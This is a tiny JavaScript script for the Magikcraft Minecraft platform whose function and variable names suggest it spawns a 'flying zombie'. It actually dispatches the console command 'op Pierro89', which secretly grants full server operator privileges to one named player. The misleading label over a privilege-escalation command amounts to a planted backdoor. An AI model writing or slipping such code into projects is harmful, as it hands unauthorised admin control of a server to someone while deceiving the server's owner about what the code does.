const magik = magikcraft.io;

function fz() {

    function run(cmd) {
        var sudo = magik.getPlugin().getServer().getConsoleSender();
        magik.getPlugin().getServer().dispatchCommand(sudo, cmd);
    }
    const flyingZombieCmd = 'op Pierro89';

    run(flyingZombieCmd);
}